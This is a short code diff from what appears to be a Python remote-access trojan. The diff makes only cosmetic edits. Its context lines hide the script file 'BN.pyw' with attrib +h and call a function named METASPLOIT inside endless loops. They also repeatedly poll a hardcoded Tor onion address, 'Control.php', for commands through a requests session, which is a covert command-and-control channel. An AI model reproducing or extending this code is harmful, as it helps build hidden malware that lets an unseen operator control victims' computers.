@@ -49,7 +49,7 @@ subprocess.Popen("attrib +h BN.pyw", shell=True)
  #    time.sleep(1)
 
 #A = threading.Thread(target=COPY)
-#A.daemon = True  
+#A.daemon = True
 #A.start()
 
 def METASPLOIT(): 
@@ -322,7 +322,7 @@ while True:
             METASPLOIT()
             while True:
                 METASPLOIT()
-                php_script_url = f'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Control.php'
+                php_script_url = 'http://cbo4lp2r6udkuvx5ds6cfsny24bs3lqowhbfqlggfbwp5jnq64nb3vqd.onion/Control.php'
                 
                 response = requests_session.get(php_script_url)
                 data = response.text.strip()
